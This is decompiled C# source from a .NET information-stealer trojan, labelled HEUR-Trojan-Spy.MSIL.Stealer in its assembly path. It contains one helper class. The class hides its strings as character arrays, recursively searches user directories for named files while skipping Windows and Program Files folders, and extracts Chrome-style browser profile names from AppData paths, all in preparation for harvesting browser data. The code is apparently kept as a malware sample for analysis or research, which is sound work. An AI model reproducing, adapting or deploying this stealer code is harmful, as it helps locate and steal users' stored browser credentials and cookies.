// Decompiled with JetBrains decompiler
// Type: SystemNetTimerThreadQueueC
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using System;
using System.Collections.Generic;
using System.IO;

public class SystemNetTimerThreadQueueC
{
  public static List<string> FindPaths(
    string baseDirectory,
    int maxLevel = 4,
    int level = 1,
    params string[] files)
  {
    List<string> stringList = new List<string>();
    stringList.Add(new string(new char[9]
    {
      '\\',
      'W',
      'i',
      'n',
      'd',
      'o',
      'w',
      's',
      '\\'
    }));
    stringList.Add(new string(new char[15]
    {
      '\\',
      'P',
      'r',
      'o',
      'g',
      'r',
      'a',
      'm',
      ' ',
      'F',
      'i',
      'l',
      'e',
      's',
      '\\'
    }));
    stringList.Add(new string(new char[21]
    {
      '\\',
      'P',
      'r',
      'o',
      'g',
      'r',
      'a',
      'm',
      ' ',
      'F',
      'i',
      'l',
      'e',
      's',
      ' ',
      '(',
      'x',
      '8',
      '6',
      ')',
      '\\'
    }));
    stringList.Add(new string(new char[14]
    {
      '\\',
      'P',
      'r',
      'o',
      'g',
      'r',
      'a',
      'm',
      ' ',
      'D',
      'a',
      't',
      'a',
      '\\'
    }));
    List<string> paths = new List<string>();
    if (files != null && files.Length != 0)
    {
      if (level <= maxLevel)
      {
        try
        {
          foreach (string directory in Directory.GetDirectories(baseDirectory))
          {
            bool flag1 = false;
            foreach (string str in stringList)
            {
              if (directory.Contains(str))
              {
                flag1 = true;
                break;
              }
            }
            if (!flag1)
            {
              try
              {
                DirectoryInfo directoryInfo = new DirectoryInfo(directory);
                FileInfo[] files1 = directoryInfo.GetFiles();
                bool flag2 = false;
                for (int index1 = 0; index1 < files1.Length && !flag2; ++index1)
                {
                  for (int index2 = 0; index2 < files.Length && !flag2; ++index2)
                  {
                    string file = files[index2];
                    FileInfo fileInfo = files1[index1];
                    string name = fileInfo.Name;
                    if (file == name)
                    {
                      flag2 = true;
                      paths.Add(fileInfo.FullName);
                    }
                  }
                }
                foreach (string path in SystemNetTimerThreadQueueC.FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
                {
                  if (!paths.Contains(path))
                    paths.Add(path);
                }
              }
              catch
              {
              }
            }
          }
        }
        catch
        {
        }
        return paths;
      }
    }
    return paths;
  }

  public static string ChromeGetName(string path)
  {
    try
    {
      string[] strArray = path.Split(new char[1]{ '\\' }, StringSplitOptions.RemoveEmptyEntries);
      if (strArray[strArray.Length - 2].Contains(new string(new char[9]
      {
        'U',
        's',
        'e',
        'r',
        ' ',
        'D',
        'a',
        't',
        'a'
      })))
        return strArray[strArray.Length - 1];
    }
    catch
    {
    }
    return "Unknown";
  }

  public static string ChromeGetRoamingName(string path)
  {
    try
    {
      return path.Split(new string[1]
      {
        new string(new char[16]
        {
          'A',
          'p',
          'p',
          'D',
          'a',
          't',
          'a',
          '\\',
          'R',
          'o',
          'a',
          'm',
          'i',
          'n',
          'g',
          '\\'
        })
      }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
      {
        '\\'
      }, StringSplitOptions.RemoveEmptyEntries)[0];
    }
    catch
    {
    }
    return string.Empty;
  }

  public static string ChromeGetLocalName(string path)
  {
    try
    {
      string[] strArray = path.Split(new string[1]
      {
        new string(new char[14]
        {
          'A',
          'p',
          'p',
          'D',
          'a',
          't',
          'a',
          '\\',
          'L',
          'o',
          'c',
          'a',
          'l',
          '\\'
        })
      }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
      {
        '\\'
      }, StringSplitOptions.RemoveEmptyEntries);
      return strArray[0] + "_[" + strArray[1] + "]";
    }
    catch
    {
    }
    return string.Empty;
  }
}
